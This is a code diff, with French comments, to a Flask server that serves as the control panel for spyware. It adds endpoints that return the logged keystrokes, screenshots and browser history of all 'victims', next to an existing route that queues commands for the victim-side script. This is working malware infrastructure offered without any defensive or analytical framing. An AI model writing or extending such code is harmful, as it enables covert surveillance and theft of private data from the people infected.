@@ -19,7 +19,6 @@ UPLOAD_FOLDER = 'static/uploads'
 app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER
 
 # Créer les dossiers nécessaires s'ils n'existent pas
-os.makedirs(os.path.dirname(DATABASE), exist_ok=True)
 os.makedirs(UPLOAD_FOLDER, exist_ok=True)
 
 # --- Fonctions Utilitaires pour la Base de Données ---
@@ -105,6 +104,32 @@ def send_command():
     conn.commit()
     conn.close()
     return jsonify({"status": "success", "message": "Command queued"})
+
+# --- NOUVELLES ROUTES POUR LES PAGES GLOBALES ---
+
+@app.route('/api/keystrokes', methods=['GET'])
+def get_all_keystrokes():
+    """Retourne toutes les frappes de toutes les victimes pour la page globale."""
+    conn = get_db_connection()
+    logs = conn.execute('SELECT * FROM logs ORDER BY timestamp DESC LIMIT 200').fetchall()
+    conn.close()
+    return jsonify([dict(log) for log in logs])
+
+@app.route('/api/screenshots', methods=['GET'])
+def get_all_screenshots():
+    """Retourne toutes les captures d'écran de toutes les victimes pour la page globale."""
+    conn = get_db_connection()
+    screenshots = conn.execute('SELECT * FROM screenshots ORDER BY timestamp DESC LIMIT 50').fetchall()
+    conn.close()
+    return jsonify([dict(screenshot) for screenshot in screenshots])
+
+@app.route('/api/browser-history', methods=['GET'])
+def get_all_browser_history():
+    """Retourne tout l'historique du navigateur de toutes les victimes pour la page globale."""
+    conn = get_db_connection()
+    history = conn.execute('SELECT * FROM browser_history ORDER BY timestamp DESC LIMIT 100').fetchall()
+    conn.close()
+    return jsonify([dict(entry) for entry in history])
 
 # --- API Endpoints pour le Script de la Victime ---
 
